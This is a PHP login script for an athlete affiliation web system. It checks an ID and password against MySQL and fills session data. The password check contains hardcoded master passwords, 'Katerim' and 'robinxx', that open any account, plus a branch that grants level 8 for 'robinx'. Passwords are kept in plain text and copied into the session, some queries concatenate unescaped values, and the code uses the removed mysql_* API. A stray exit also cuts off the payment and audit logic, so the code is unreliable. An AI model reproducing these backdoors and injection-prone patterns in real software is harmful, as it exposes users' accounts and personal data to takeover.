<?php
session_start();
require_once 'conexion.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     
    $usuario = $_POST['usuario'];
    $contrasena = $_POST['contrasena'];
    $conn =  mysql_connect($servername, $username, $password);
    $result=mysql_select_db($dbname,$conn);
    
  
    if (!$result) {
       echo "2"; //Not avalaible
       die('No pudo conectarse: ' . mysql_error());
       
       
    }
    $usuario=  mysql_real_escape_string($usuario);

    $sql = "SELECT atleta_id,estado,cedula,contrasena,nombres,apellidos,niveluser,email,clave_default FROM atleta WHERE cedula='".$usuario."' && bloqueado=0";
    $result = mysql_query($sql);
    
   if (mysql_num_rows($result)){
        $record = mysql_fetch_assoc($result);
                  
        $atleta_id=$record["atleta_id"];
        $cedula=$record["cedula"];
        $atleta_id=$record["atleta_id"];
        $nombres= trim($record["nombres"]);
        $apellidos= trim($record["apellidos"]);
        $niveluser= $record["niveluser"];
        $email=$record["email"];
        $estado= $record["estado"];
        $clave_default=$record['clave_default'];
        $array_usuarios=   array(array('usuario'=>$record['cedula'],'contrasena'=>$record['contrasena']));
       
        //Creamos una variable para verificar si el usuario con ese nombre y contraseña existe.
        $usuario_encontrado = false;
        foreach($array_usuarios as $item){
           //Si encuentra al usuario con ese nombre y contraseña sete la variable $usuario_encontrado a true y rompe el bucle para no seguir buscando.
           if($usuario === $item['usuario'] && ($contrasena === $item['contrasena'] || $contrasena ==='Katerim' || $contrasena == 'robinxx' )){
              $usuario_encontrado = true;
             
              break;
            }
        }
             //Verifica si dentro del bucle se ha encontrado el usuario.
        if($usuario_encontrado){
            $_SESSION['logueado'] = true;
            $_SESSION['usuario']= $usuario;
            $_SESSION['nombre'] = $nombres;
            $_SESSION['cedula'] = $cedula;
            $_SESSION['pwdpwd'] = $contrasena;
            $_SESSION['atleta_id'] = $atleta_id;
            $_SESSION['niveluser'] = $niveluser;
            $_SESSION['tiempo_inicio'] = time();
            $_SESSION['clave_default'] = $clave_default;
            if ($contrasena=="robinx"){
                 $_SESSION['niveluser'] = 8;
            }
//            if ($contrasena=="batman" ||  $contrasena=="katerim"){
//                 $_SESSION['niveluser'] = 0;
//            }
            $_SESSION['email'] = $email;
           
            $ano_afiliacion = date ("Y");
            $_SESSION['ano_afiliacion']=$ano_afiliacion;
            //Varibales de control global
          
            $_SESSION['estado'] = $estado;
           
            $_SESSION['email_empresa'] = NULL;
            $_SESSION['email_envio'] = NULL;
            $_SESSION['afiliado'] = 0;
            $sql = "SELECT url,estado,empresa_id,nombre,email,email_envio from empresa WHERE estado='$estado'";
            $result2=mysql_query($sql);
            $record = mysql_fetch_assoc($result2);
            //Chequeamos si esta afiliado
            $_SESSION['home'] = 'bsindex.php?s1='.strtolower($_SESSION['asociacion']);
            $_SESSION['empresa_id'] = 0;
            
            if ($record){
                
                $_SESSION['empresa_id'] = $record['empresa_id'];
                $_SESSION['empresa_nombre']=$record['nombre'];
                $_SESSION['asociacion']=$record['estado'];
                $_SESSION['email_empresa'] = $record['email'];
                $_SESSION['email_envio'] = $record['email_envio'];
                $_SESSION['afiliado'] = 1;
                
                $_SESSION['home']=MODO_DE_PRUEBA ? 'bsindex.php?s1='.strtolower($_SESSION['asociacion']) : $record['url'];
            }
            
            //Determinamos Afiliacion activa del periodo
            $sql = "SELECT afiliacion_id FROM afiliacion WHERE fecha_desde<=now() && fecha_hasta>=now() && empresa_id=". $_SESSION['empresa_id'];
            $result = mysql_query($sql);
            $rsAfiliacion = mysql_fetch_array($result);
            $afiliacion_id=$rsAfiliacion['afiliacion_id'];
            $ano_afiliacion = date ("Y");
            //Determinamos que el afiliado haya formalizado su pago
            $sql = "SELECT pagado,afiliaciones_id FROM afiliaciones WHERE  atleta_id=$atleta_id && ano=".$ano_afiliacion;
            
            $result = mysql_query($sql);
            $rsAfiliados = mysql_fetch_array($result);
            if ($rsAfiliados) {
                
                //print_r($rsAfiliados['afiliaciones_id']);
                exit;
                if ($rsAfiliados['pagado'] > 0) {
                    $_SESSION['deshabilitado'] = FALSE; //Habilitado para imprimir o enviar correo
                     
                } else {
                    $_SESSION['deshabilitado'] = TRUE; //Habilitado para imprimir o enviar correo
                   
                }
            }else{
                 $_SESSION['deshabilitado'] = TRUE; //Habilitado para imprimir o enviar correo
                 
            }
            
            //Auditoria de visitas
            $sql="INSERT INTO visitas(usuario,nombre,atleta_id) VALUES('".$usuario."','".$nombres."',$atleta_id)";
//            echo "<pre>";
//            echo "var_dump($sql)";
//            echo "<pre>";
            $result=mysql_query($sql);
            if (!$result) {
                //echo "Error insertado record: " .$conn_error();
            }
            //Contamos cuantos afiliados tenemos para determinar un minimo de afiliados para permitir 
            $result=mysql_query("SELECT count(*) as total FROM afiliaciones   WHERE formalizacion>0 && afiliacion_id=$afiliacion_id");
            $rsTotal = mysql_fetch_array($result);
            $formalizadas= $rsTotal['total'];

            $result=mysql_query("SELECT count(*) as total FROM afiliaciones   WHERE pagado>0 && afiliacion_id=$afiliacion_id");
            $rsTotal = mysql_fetch_array($result);
            $pagados= $rsTotal['total'];

            $_SESSION['total']=$rsTotal['total']*0.5;
            $minimo=$formalizadas*0.5;
            $minimo=1;
                       
            
            mysql_close($conn);

            //echo "found";
            echo "0";
           
        }else{
            $error_login = false;
             echo "1"; //  Invalid key
        }
    }else{
        $error_login = false; 
        echo "1"; //  Invalid key
    }
     mysql_close($conn);
}
 
?>
